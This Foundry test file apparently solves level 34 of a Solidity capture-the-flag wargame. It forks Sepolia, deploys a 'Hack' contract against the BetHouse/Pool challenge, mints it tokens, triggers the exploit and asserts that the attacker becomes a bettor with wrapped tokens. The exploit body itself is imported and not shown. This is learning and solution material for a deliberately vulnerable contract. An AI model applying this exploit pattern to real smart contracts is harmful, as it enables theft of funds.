//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, BetHouse, Pool, PoolToken} from "../src/level34.sol";

contract level34Test is Test {
    BetHouse target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = BetHouse(instanceAddress);
    }

    function testSolvesLeve34() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);

        Pool pool = Pool(target.pool());
        PoolToken depositToken = PoolToken(pool.depositToken());
        PoolToken wrappedToken = PoolToken(pool.wrappedToken());

        bool isBettorBefore = target.isBettor(hacker);
        console.log("Is bettor before:", isBettorBefore);
        console.log("Pool address:", address(pool));
        console.log("Deposit token address:", address(depositToken));

        vm.startPrank(hacker, hacker);
        Hack attackContract = new Hack{value: 0}(address(target), hacker);

        vm.stopPrank();

        vm.prank(depositToken.owner());
        depositToken.mint(address(attackContract), 5);

        uint256 hackBalanceBefore = depositToken.balanceOf(
            address(attackContract)
        );
        console.log("Hack contract PDT balance before:", hackBalanceBefore);

        vm.startPrank(hacker, hacker);
        attackContract.hack{value: 0.001 ether}();
        pool.lockDeposits();
        target.makeBet(hacker);
        vm.stopPrank();

        bool isBettorAfter = target.isBettor(hacker);
        uint256 hackerWrappedBalance = wrappedToken.balanceOf(hacker);
        bool depositsLocked = pool.depositsLocked(hacker);

        console.log("Is bettor after:", isBettorAfter);
        console.log("Hacker wrapped token balance:", hackerWrappedBalance);
        console.log("Deposits locked:", depositsLocked);

        assertTrue(isBettorAfter, "Hacker should be a bettor");
        assertGe(
            hackerWrappedBalance,
            20,
            "Hacker should have at least 20 wrapped tokens"
        );
        assertTrue(depositsLocked, "Hacker deposits should be locked");
    }
}
//INSTANCE_AD=0xa529c1dC47F884A8731c4fA9C494bf1401D9d35d forge test --mt testSolvesLeve34 -vvv
